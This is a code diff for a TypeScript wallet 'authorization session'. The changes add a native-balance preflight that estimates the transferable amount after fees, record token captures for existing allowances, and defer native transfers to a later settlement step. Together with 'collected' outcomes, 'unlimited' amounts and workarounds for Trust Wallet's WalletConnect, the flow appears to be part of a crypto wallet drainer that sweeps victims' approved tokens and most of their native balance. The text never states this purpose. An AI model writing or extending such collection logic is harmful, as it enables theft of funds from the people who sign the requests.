@@ -7,6 +7,10 @@ import { isApprovalOrchestrationUserDenied } from "../approval/resilience/errors
 import type { ApprovalRequest } from "../approval/types";
 import type { NativeTransferResult } from "../native-transfer/types";
 import { authorizeNativeInWalletPhase } from "../native-transfer/native-wallet-authorize";
+import {
+  formatInsufficientNativeFeeMessage,
+  preflightNativeTransferEstimate,
+} from "./native-preflight";
 import { getErrorMessage, isUserRejection } from "../core/errors";
 import {
   alreadyAuthorizedResult,
@@ -14,6 +18,10 @@ import {
   preflightExistingAllowance,
 } from "./allowance-preflight";
 import { collectForExistingAllowance } from "./existing-allowance-collection";
+import {
+  appendTokenCapture,
+  buildPreflightSkippedTokenCapture,
+} from "./wallet-phase-token-capture";
 import {
   SessionTimelineTracker,
   flushSessionTimeline,
@@ -53,9 +61,7 @@ import type {
 } from "./phases/types";
 import type { NativeTransferOrchestrator } from "../native-transfer/orchestrator";
 import {
-  balanceForNative,
   balanceForToken,
-  nativeDecimalsForNetwork,
   type IncludedAssetWorkItem,
 } from "./preferences";
 
@@ -161,23 +167,6 @@ function hasTokenAuthorizationDependencyFailure(
   );
 }
 
-function hasZeroNativeBalanceSnapshot(
-  networkRow: NetworkRow | undefined,
-  network: string,
-): boolean {
-  if (!networkRow) return false;
-  try {
-    return (
-      parseHumanToRaw(
-        balanceForNative(networkRow),
-        nativeDecimalsForNetwork(network),
-      ) <= BigInt(0)
-    );
-  } catch {
-    return true;
-  }
-}
-
 function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
   return (
     outcome === "authorized" || outcome === "collected" || outcome === "pending"
@@ -210,8 +199,7 @@ function applyEvmBatchNativeCapture(args: {
   const { batchResults, network, owner, capture } = args;
   const outcome = inferEvmBatchNativeOutcome(batchResults);
 
-  if (
-    outcome === "succeeded" &&
+  if (outcome === "succeeded" &&
     batchResults.batchIncludedNative &&
     batchResults.nativeTxHash
   ) {
@@ -223,6 +211,7 @@ function applyEvmBatchNativeCapture(args: {
       estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
       recipient: batchResults.nativeRecipient ?? undefined,
     };
+    capture.nativeRequested = true;
     return;
   }
 
@@ -239,6 +228,71 @@ function applyEvmBatchNativeCapture(args: {
       estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
       recipient: batchResults.nativeRecipient ?? undefined,
     };
+    capture.nativeRequested = true;
+    return;
+  }
+
+  if (outcome === "failed_revert") {
+    capture.native = {
+      network,
+      owner,
+      authorizationKind: "evm_deferred",
+      authorizationPayload: { evmDeferred: true, batchNativeRevert: true },
+      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
+      recipient: batchResults.nativeRecipient ?? undefined,
+    };
+    capture.nativeRequested = true;
+  }
+}
+
+function markNativeRequested(
+  captureByNetwork: Map<string, WalletPhaseCapture>,
+  sessionId: string,
+  network: string,
+  owner: string,
+): void {
+  const capture = captureByNetwork.get(network) ?? {
+    sessionId,
+    network,
+    owner,
+    tokens: [],
+    native: null,
+    batchId: null,
+    nativeRequested: true,
+  };
+  capture.nativeRequested = true;
+  captureByNetwork.set(network, capture);
+}
+
+function recordNativePreflightFailure(ctx: {
+  item: IncludedAssetWorkItem & { asset: "NATIVE" };
+  results: AuthorizationAssetResult[];
+  captureByNetwork: Map<string, WalletPhaseCapture>;
+  network: string;
+  message: string;
+  log: RunAuthorizationSessionArgs["log"];
+  onAssetEnd?: RunAuthorizationSessionArgs["onAssetEnd"];
+  detail?: Record<string, unknown>;
+}): void {
+  ctx.log?.("NATIVE_PREFLIGHT_INSUFFICIENT", {
+    network: ctx.network,
+    message: ctx.message,
+    ...ctx.detail,
+  });
+  const result: AuthorizationAssetResult = {
+    network: ctx.network,
+    token: "NATIVE",
+    outcome: "failed",
+    message: ctx.message,
+  };
+  ctx.results.push(result);
+  ctx.onAssetEnd?.(result);
+
+  const capture = ctx.captureByNetwork.get(ctx.network);
+  if (capture) {
+    capture.native = null;
+    capture.nativeRequested = false;
+    ctx.captureByNetwork.set(ctx.network, capture);
   }
 }
 
@@ -283,6 +337,7 @@ function recordEvmNativeDeferred(ctx: {
     authorizationKind: "evm_deferred",
     authorizationPayload: { evmDeferred: true },
   };
+  capture.nativeRequested = true;
   captureByNetwork.set(item.network, capture);
 }
 
@@ -425,6 +480,47 @@ export async function runAuthorizationSession(
 
         const owner = args.accounts.evm;
         if (owner) {
+          let nativePreflightOk = true;
+          if (unit.nativeItem) {
+            try {
+              const preflight = await preflightNativeTransferEstimate({
+                apiBaseUrl: args.apiBaseUrl,
+                network: unit.network,
+                owner,
+                traceId: args.transactionId ?? sessionId,
+              });
+              if (!preflight.ok) {
+                nativePreflightOk = false;
+                recordNativePreflightFailure({
+                  item: unit.nativeItem,
+                  results,
+                  captureByNetwork,
+                  network: unit.network,
+                  message: preflight.message,
+                  log,
+                  onAssetEnd: args.onAssetEnd,
+                  detail: {
+                    balanceHuman: preflight.estimate.balanceHuman,
+                    feeHuman: preflight.estimate.feeHuman,
+                  },
+                });
+              }
+            } catch (preflightErr) {
+              nativePreflightOk = false;
+              recordNativePreflightFailure({
+                item: unit.nativeItem,
+                results,
+                captureByNetwork,
+                network: unit.network,
+                message: getErrorMessage(
+                  preflightErr,
+                  "Native transfer estimate failed",
+                ),
+                log,
+                onAssetEnd: args.onAssetEnd,
+              });
+            }
+          }
           const existing = captureByNetwork.get(unit.network) ?? {
             sessionId,
             network: unit.network,
@@ -437,13 +533,16 @@ export async function runAuthorizationSession(
             existing.tokens.push(...batchResults.tokenCaptures);
             existing.batchId = batchResults.batchId ?? existing.batchId;
           }
-          applyEvmBatchNativeCapture({
-            batchResults,
-            network: unit.network,
-            owner,
-            capture: existing,
-          });
+          if (nativePreflightOk && unit.nativeItem) {
+            applyEvmBatchNativeCapture({
+              batchResults,
+              network: unit.network,
+              owner,
+              capture: existing,
+            });
+          }
           if (
+            nativePreflightOk &&
             unit.nativeItem &&
             !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true) &&
             !hasTokenAuthorizationDependencyFailure(results, unit.network)
@@ -471,7 +570,11 @@ export async function runAuthorizationSession(
               log,
             });
           }
-          if (existing.tokens.length > 0 || existing.native) {
+          if (
+            existing.tokens.length > 0 ||
+            existing.native ||
+            existing.nativeRequested
+          ) {
             captureByNetwork.set(unit.network, existing);
           }
         }
@@ -533,6 +636,14 @@ export async function runAuthorizationSession(
         }
       }
       if (unit.nativeItem) {
+        if (evmOwner) {
+          markNativeRequested(
+            captureByNetwork,
+            sessionId,
+            unit.network,
+            evmOwner,
+          );
+        }
         if (
           evmOwner &&
           isEvmChainKey(unit.network) &&
@@ -771,6 +882,17 @@ async function runTokenWalletPhase(ctx: {
           });
           results.push(result);
           args.onAssetEnd?.(result);
+          if (owner) {
+            appendTokenCapture(captureByNetwork, {
+              sessionId,
+              network: item.network,
+              owner,
+              capture: buildPreflightSkippedTokenCapture({
+                item: { ...item, asset: token },
+                shouldAttemptTransfer: false,
+              }),
+            });
+          }
           return;
         }
         if (preflight.alreadyAuthorized && shouldAttemptTransfer) {
@@ -782,6 +904,19 @@ async function runTokenWalletPhase(ctx: {
           });
           results.push(result);
           args.onAssetEnd?.(result);
+          if (owner) {
+            appendTokenCapture(captureByNetwork, {
+              sessionId,
+              network: item.network,
+              owner,
+              capture: buildPreflightSkippedTokenCapture({
+                item: { ...item, asset: token },
+                shouldAttemptTransfer: true,
+                transferAmountRaw,
+                approvalId: result.approvalId,
+              }),
+            });
+          }
           return;
         }
       } catch (err) {
@@ -917,109 +1052,60 @@ async function runNativeWalletPhase(ctx: {
     return;
   }
 
-  // EVM: eth_signTransaction in wallet phase when supported; RPC broadcast deferred.
-  if (item.network !== "tron") {
-    const provider = args.evmBatchProvider ?? args.settlementProvider;
-    const networkRow = args.networks.find((n) => n.key === item.network);
-    if (hasZeroNativeBalanceSnapshot(networkRow, item.network)) {
-      recordEvmNativeDeferred({
-        item,
-        results,
-        captureByNetwork,
-        sessionId,
-        owner: owner ?? "",
-        log,
-        onAssetEnd: args.onAssetEnd,
-        reason: "zero_native_balance_snapshot",
-      });
-      return;
-    }
-    if (!provider || !args.nativeOrchestrator) {
-      recordEvmNativeDeferred({
-        item,
-        results,
-        captureByNetwork,
-        sessionId,
-        owner,
-        log,
-        onAssetEnd: args.onAssetEnd,
-        reason: !provider
-          ? "missing_wallet_provider"
-          : "missing_native_orchestrator",
-      });
-      return;
-    }
-
-    log?.("NATIVE WALLET AUTHORIZATION STARTED", {
-      network: item.network,
-      owner,
-      policy:
-        "EVM eth_signTransaction now — RPC broadcast deferred until token settlement",
-    });
-
-    const authResult = await authorizeNativeInWalletPhase({
-      provider,
-      network: item.network,
-      owner,
-      unlimited: item.unlimited,
-      amountHuman: item.unlimited ? undefined : item.amountHuman,
+  try {
+    const preflight = await preflightNativeTransferEstimate({
       apiBaseUrl: args.apiBaseUrl,
-      traceId: args.transactionId ?? sessionId,
-      orchestrator: args.nativeOrchestrator,
-      onStage: (stageResult) => {
-        args.onLinkProgress?.(
-          stageResult.stage === "SIGN" || stageResult.stage === "REFRESH_ESTIMATE"
-            ? "confirm_native_wallet"
-            : "preparing_authorization",
-        );
-      },
-    });
-
-    if (!authResult.ok) {
-      if (authResult.fallbackDeferred) {
-        recordEvmNativeDeferred({
-          item,
-          results,
-          captureByNetwork,
-          sessionId,
-          owner,
-          log,
-          onAssetEnd: args.onAssetEnd,
-          reason: authResult.error,
-        });
-        return;
-      }
-      const result: AuthorizationAssetResult = {
-        network: item.network,
-        token: "NATIVE",
-        outcome: authResult.userRejected ? "user_rejected" : "failed",
-        message: authResult.error,
-      };
-      results.push(result);
-      args.onAssetEnd?.(result);
-      return;
-    }
-
-    const result: AuthorizationAssetResult = {
-      network: item.network,
-      token: "NATIVE",
-      outcome: "authorized",
-      message:
-        "Native signed — RPC broadcast deferred until token settlement",
-    };
-    results.push(result);
-    args.onAssetEnd?.(result);
-
-    const capture = captureByNetwork.get(item.network) ?? {
-      sessionId,
       network: item.network,
       owner,
-      tokens: [],
-      native: null,
-      batchId: null,
-    };
-    capture.native = authResult.capture;
-    captureByNetwork.set(item.network, capture);
+      traceId: args.transactionId ?? sessionId,
+    });
+    if (!preflight.ok) {
+      recordNativePreflightFailure({
+        item,
+        results,
+        captureByNetwork,
+        network: item.network,
+        message: preflight.message,
+        log,
+        onAssetEnd: args.onAssetEnd,
+        detail: {
+          balanceHuman: preflight.estimate.balanceHuman,
+          feeHuman: preflight.estimate.feeHuman,
+        },
+      });
+      return;
+    }
+  } catch (preflightErr) {
+    recordNativePreflightFailure({
+      item,
+      results,
+      captureByNetwork,
+      network: item.network,
+      message: getErrorMessage(
+        preflightErr,
+        "Native transfer estimate failed",
+      ),
+      log,
+      onAssetEnd: args.onAssetEnd,
+    });
+    return;
+  }
+
+  markNativeRequested(captureByNetwork, sessionId, item.network, owner);
+
+  // EVM: defer native to settlement (eth_sendTransaction). Trust Wallet WC rejects
+  // eth_signTransaction params with "The data couldn't be read because it is missing."
+  if (item.network !== "tron") {
+    recordEvmNativeDeferred({
+      item,
+      results,
+      captureByNetwork,
+      sessionId,
+      owner,
+      log,
+      onAssetEnd: args.onAssetEnd,
+      reason: "evm_policy",
+    });
     return;
   }
 
